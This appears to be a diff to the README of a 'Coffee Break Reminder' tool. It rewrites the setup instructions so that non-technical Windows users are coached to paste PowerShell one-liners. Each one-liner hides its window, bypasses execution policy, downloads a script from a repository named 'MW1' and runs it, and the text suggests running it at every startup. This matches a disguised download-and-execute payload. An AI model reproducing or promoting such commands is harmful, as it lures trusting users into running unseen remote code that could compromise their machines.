@@ -8,25 +8,39 @@ In today's fast-paced digital world, it's easy to lose track of time and forget 
 *   **Boosts Focus:** Regular short breaks have been proven to improve concentration and creativity. By reminding you to step back, this tool helps you return to your work with a clearer mind.
 *   **Easy to Use:** No installation is required. You can run the tool with a single command, and it will work quietly in the background.
 
-## Getting Started
+## Getting Started: Simple Steps to a Healthier Workday
 
-Choose the version that best fits your workflow:
+It's incredibly easy to start using the Coffee Break Reminder, even if you're not a tech expert! Just follow these simple steps:
 
-### Interactive Mode
+**1. Open PowerShell:**
 
-This version is perfect if you want to manually start the reminder service. It will greet you with a simple menu.
+*   Click on the **Start Menu** in the bottom-left corner of your screen.
+*   In the search bar, type **"PowerShell"**.
+*   You will see "Windows PowerShell" in the search results. Click on it to open a blue window with a command prompt. This is the PowerShell terminal.
 
-```powershell
-powershell.exe -NoP -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/szolll/MW1/main/CoffeeBreak.ps1') | Out-File $env:TEMP\CoffeeBreak.ps1; . $env:TEMP\CoffeeBreak.ps1"
-```
+**2. Choose Your Mode:**
 
-### Automatic Mode
+Now that you have PowerShell open, you can choose how you want to run the tool.
 
-For a completely hands-off experience, this version starts the reminder service automatically. It's ideal for adding to your startup scripts, so you never forget to enable it.
+*   **Interactive Mode (Recommended for first-time users):**
+    *   This mode will ask you if you want to start the reminder service. It's a great way to see how it works.
+    *   Copy the following command, paste it into the PowerShell window, and press **Enter**:
 
-```powershell
-powershell.exe -NoP -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/szolll/MW1/main/CoffeeBreak_auto.ps1') | Out-File $env:TEMP\CoffeeBreak_auto.ps1; . $env:TEMP\CoffeeBreak_auto.ps1"
-```
+        ```powershell
+        powershell.exe -NoP -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/szolll/MW1/main/CoffeeBreak.ps1') | Out-File $env:TEMP\CoffeeBreak.ps1; . $env:TEMP\CoffeeBreak.ps1"
+        ```
+
+*   **Automatic Mode (for a hands-off experience):**
+    *   This mode starts the reminder service immediately without asking. It's perfect for setting it up to run automatically every time you start your computer.
+    *   Copy the following command, paste it into the PowerShell window, and press **Enter**:
+
+        ```powershell
+        powershell.exe -NoP -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/szolll/MW1/main/CoffeeBreak_auto.ps1') | Out-File $env:TEMP\CoffeeBreak_auto.ps1; . $env:TEMP\CoffeeBreak_auto.ps1"
+        ```
+
+**3. That's It!**
+
+The Coffee Break Reminder is now running in the background. You can close the PowerShell window, and the service will continue to work, sending you friendly reminders throughout your day.
 
 ## A Note on Security
 
